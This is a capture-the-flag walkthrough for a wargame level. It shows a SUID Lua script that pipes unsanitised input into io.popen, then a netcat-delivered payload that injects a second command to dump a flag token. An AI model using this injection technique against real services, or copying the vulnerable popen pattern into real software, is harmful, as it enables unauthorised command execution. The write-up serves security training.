# Level 11 - Command Injection Exploit

This level demonstrates a **command injection** vulnerability in a Lua script.

---

## Step 1: Inspect the Directory

```bash
ls -la
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile
```

    level11.lua is SUID and runs with flag11's privileges.

Step 2: Examine the Lua Script

```bash
cat level11.lua
```

The script content:

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog\:read("*all")
  prog\:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server\:accept()
  client\:send("Password: ")
  client\:settimeout(60)
  local l, err = client\:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client\:send("Erf nope..\n");
      else
          client\:send("Gz you dumb*\n")
      end

  end

  client\:close()
end
```

The program waits for a connection on port 5151 and asks for a password. By using io.popen, we can inject a script.
Step 3: Exploit the Command Injection

```bash
nc 0.0.0.0 5151
Password: \";getflag > /tmp/token;\"
Erf nope..
```

Step 4: Retrieve the Token

```bash
cat /tmp/token
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

✅ Summary

    Command Injection: The use of io.popen allowed us to inject a command to retrieve the flag.
    The level11.lua script failed to securely handle user input.
    This exposed a restricted file by executing arbitrary commands.
